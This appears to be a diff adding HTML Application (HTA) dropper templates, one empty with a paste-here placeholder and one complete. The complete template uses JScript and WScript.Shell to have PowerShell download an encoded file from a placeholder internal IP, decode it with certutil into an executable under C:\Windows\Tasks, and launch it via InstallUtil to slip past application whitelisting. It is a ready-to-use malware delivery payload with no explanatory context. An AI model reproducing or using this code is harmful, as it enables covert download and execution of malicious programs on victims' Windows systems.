@@ -1,0 +1,33 @@
+<html>
+<head>
+<script language="JScript">
+<!--- PASTE JSCRIPT BELOW --->                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              -->
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
+
+
+<html>
+<head>
+<script language="JScript">
+
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("powershell iwr -uri http://192.168.X.Y/enc5.txt -outfile
+C:\\Windows\\Tasks\\enc7.txt;powershell certutil -decode C:\\Windows\\Tasks\\enc7.txt
+C:\\Windows\\Tasks\\gimme3.exe;
+C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=
+/LogToConsole=false /U C:\\Windows\\Tasks\\gimme3.exe");
+
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
